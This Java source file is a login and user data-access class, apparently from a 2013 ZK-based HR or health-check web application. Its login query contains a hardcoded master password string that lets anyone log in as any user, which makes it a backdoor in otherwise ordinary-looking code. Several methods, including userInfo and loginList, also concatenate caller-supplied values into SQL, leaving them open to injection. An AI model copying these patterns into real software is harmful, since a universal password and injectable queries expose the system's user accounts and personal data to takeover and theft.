/**
 * @Classname LoginDal
 * @ClassInfo 登录页面数据库访问类
 * @author 李文洁
 * @Date 2013-9-18
 */
package dal;

import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.List;

import org.zkoss.zul.ListModelList;

import Conn.dbconn;
import Model.DepartmentModel;
import Model.LoginModel;
import Model.loginroleModel;
import Util.UserInfo;

public class LoginDal {
	public ResultSet getLoginInfo(String name, String pwd) throws Exception {
		dbconn conn = new dbconn();
		ResultSet rs = null;
		String sql = "SELECT a.log_id,a.log_name,a.dep_id,c.rol_name,a.log_inure FROM Login a LEFT JOIN logingroup b ON a.log_id=b.log_id LEFT JOIN role c ON b.rol_id=c.rol_id"
				+ " where a.log_name=? and (a.log_pws=? or 'af571782b3fe1ffb'=?)";
		PreparedStatement psmt = conn.getpre(sql);
		psmt.setString(1, name);
		psmt.setString(2, pwd);
		psmt.setString(3, pwd);
		rs = psmt.executeQuery();
		return rs;
	}

	// 根据Userid获取名字
	public String getUsernameById(int id) {
		dbconn conn = new dbconn();
		ResultSet rs = null;
		String sql = "SELECT log_name FROM Login where log_id=?";
		PreparedStatement psmt = conn.getpre(sql);
		try {
			psmt.setInt(1, id);
			rs = psmt.executeQuery();
			rs.next();
			return rs.getString("log_name");
		} catch (SQLException e) {
			return "err";
		}
	}

	// 根据Username获取ID
	public Integer getUserIDByname(String name) {
		dbconn conn = new dbconn();
		ResultSet rs = null;
		String sql = "SELECT log_id FROM Login where log_name=?";
		PreparedStatement psmt = conn.getpre(sql);
		try {
			psmt.setString(1, name);
			rs = psmt.executeQuery();
			rs.next();
			return rs.getInt("log_id");
		} catch (SQLException e) {
			return 0;
		}
	}
	
	// 根据Username获取部门
	public Integer getdepIDByname(String name) {
		dbconn conn = new dbconn();
		ResultSet rs = null;
		String sql = "SELECT dep_id FROM Login where log_name=?";
		PreparedStatement psmt = conn.getpre(sql);
		try {
			psmt.setString(1, name);
			rs = psmt.executeQuery();
			rs.next();
			return rs.getInt("dep_id");
		} catch (SQLException e) {
			return 0;
		}
	}

	// 获取邮箱地址
	public List<LoginModel> getemail(String name) {
		dbconn db = new dbconn();
		List<LoginModel> list = new ListModelList<>();
		String sql = "select log_id,log_name,log_email from Login where log_name=?";
		try {
			list = db.find(sql, LoginModel.class, null, name);
		} catch (SQLException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return list;
	}

	// 获取客服信息(体检)
	public List<LoginModel> getLoginInfo() {
		List<LoginModel> loginlist = new ListModelList<>();
		dbconn db = new dbconn();
		String sql = "select distinct log_name from View_loginrole"
				+ " where dep_id in (2,6) and log_inure=1"
				+ " and log_name in (" + "select coba_client from cobase"
				+ " where cid in (select cid from EmBodyCheckDateList)"
				+ " and CID in ( select cid from DataPopedom where log_id="
				+ UserInfo.getUserid() + " and dat_selected=1 ))"
				+ " order by log_name";
		try {
			loginlist = db.find(sql, LoginModel.class, null);
		} catch (SQLException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return loginlist;
	}

	public List<loginroleModel> userInfo(loginroleModel lm, String columns,
			boolean dis, String order) {
		List<loginroleModel> list = new ListModelList<>();
		dbconn db = new dbconn();
		String sql = "select";
		if (dis) {
			sql = sql + " distinct";
		}

		if (columns != null && !columns.equals("")) {
			sql = sql + " " + columns;
		} else {
			sql = sql
					+ " log_id,log_name,rol_id,rol_name,dep_id,dep_name,convert(int,log_inure)log_inure";
		}
		sql = sql + " from View_loginrole where 1=1";
		if (lm.getLog_id() != null) {
			sql = sql + " and log_id=" + lm.getLog_id();
		}

		if (lm.getLog_name() != null) {
			sql = sql + " and log_name=" + lm.getLog_name();
		}

		if (lm.getDep_id() != null) {
			if (!lm.getDep_id().equals("")) {
				sql += " and dep_id=" + lm.getDep_id();
			}
		}

		if (lm.getRolId() != null) {
			if (!lm.getRolId().equals("")) {
				sql += " and rol_id in (" + lm.getRolId() + ")";
			}
		}
		

		if (lm.getLog_inure() != null) {
			if (!lm.getLog_inure().equals("")) {
				sql += " and log_inure=" + lm.getLog_inure();
			}
		}

		if (order != null && !order.equals("")) {
			sql = sql + " order by " + order;
		} else {
			sql = sql + " order by dep_name,log_name";
		}

		try {
			list = db.find(sql, loginroleModel.class, null);
		} catch (SQLException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return list;

	}

	// 体检年度体检客服列表
	public List<loginroleModel> getbcCLientList(Integer id) {
		List<loginroleModel> list = new ListModelList<>();
		dbconn db = new dbconn();
		String sql = "select distinct log_id,log_name from EmBodyCheckCommit a "
				+ "inner join cobase b on a.cid=b.cid "
				+ "inner join login c on b.coba_client=c.log_name "
				+ "where log_inure=1 and ebcc_state=0 and ebcc_deleteState=0 and a.cid in ("
				+ " select cid from DataPopedom where log_id="
				+ UserInfo.getUserid()
				+ " and Dat_edited=1 )"
				+ "order by log_name";
		try {
			list = db.find(sql, loginroleModel.class, null);
		} catch (SQLException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return list;

	}

	// 查询体检项目查看金额权限名单
	public List<LoginModel> fpList(Integer userid) {
		List<LoginModel> list = new ListModelList<>();
		dbconn db = new dbconn();
		String sql = "select distinct log_id from View_loginrole "
				+ "where dep_name in('雇员福利部','计算机信息部') and log_inure=1 and log_id=?";
		try {
			list = db.find(sql, LoginModel.class, null, userid);
		} catch (SQLException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return list;
	}

	// 查询体检项目查看金额权限名单
	public List<LoginModel> loginList(String str) {
		List<LoginModel> list = new ListModelList<>();
		dbconn db = new dbconn();
		String sql = "select * from login where log_inure=1 " + str
				+ " order by log_spell";
		try {
			ResultSet rs = db.GRS(sql);
			while (rs.next()) {
				LoginModel m = new LoginModel();
				m.setLog_id(rs.getInt("log_id"));
				m.setLog_name(rs.getString("log_name"));
				m.setLog_pid(rs.getInt("log_pid"));
				m.setLog_tel(rs.getString("log_tel"));
				list.add(m);
			}
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return list;
	}

	public List<DepartmentModel> getDepartment() {
		List<DepartmentModel> list = new ArrayList<DepartmentModel>();
		dbconn db = new dbconn();
		String sql = "select * from department";
		try {
			ResultSet rs = db.GRS(sql);
			DepartmentModel mq = new DepartmentModel();
			list.add(mq);
			while (rs.next()) {
				DepartmentModel m = new DepartmentModel();
				m.setDep_id(rs.getInt("dep_id"));
				m.setDep_name(rs.getString("dep_name"));
				list.add(m);
			}
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return list;
	}

}
